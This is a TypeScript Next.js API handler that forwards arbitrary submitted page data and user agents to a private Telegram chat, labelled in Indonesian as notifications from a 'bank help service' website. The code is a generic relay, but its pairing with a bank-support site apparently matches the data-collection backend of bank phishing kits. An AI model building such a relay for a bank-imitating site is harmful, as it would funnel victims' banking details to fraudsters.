import type { NextApiRequest, NextApiResponse } from "next";

interface TelegramMessage {
  action: string;
  message: string;
  data?: Record<string, unknown>;
  timestamp: string;
  page: string;
  userAgent: string;
}

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { action, message, data, timestamp, page, userAgent } = req.body as TelegramMessage;

  if (!action || !message) {
    return res.status(400).json({ error: "Action and message are required" });
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.error("Telegram credentials not configured");
    return res.status(500).json({ error: "Telegram credentials not configured" });
  }

  try {
    const formattedDate = new Date(timestamp).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });

    let telegramMessage = `🔔 *NOTIFIKASI WEBSITE LAYANAN BANTUAN BANK*\n\n`;
    telegramMessage += `📌 *Aksi:* ${action}\n`;
    telegramMessage += `⏰ *Waktu:* ${formattedDate}\n`;
    telegramMessage += `🔗 *Halaman:* ${page}\n\n`;
    telegramMessage += `📝 *Detail:*\n${message}\n`;

    if (data && Object.keys(data).length > 0) {
      telegramMessage += `\n📊 *Data Tambahan:*\n`;
      telegramMessage += `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
    }

    telegramMessage += `\n\n🌐 *User Agent:* \`${userAgent}\``;

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: telegramMessage,
        parse_mode: "Markdown",
        disable_web_page_preview: true,
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error("Telegram API error:", errorData);
      return res.status(500).json({ error: "Failed to send Telegram message" });
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Error sending Telegram notification:", error);
    return res.status(500).json({ error: "Internal server error" });
  }
}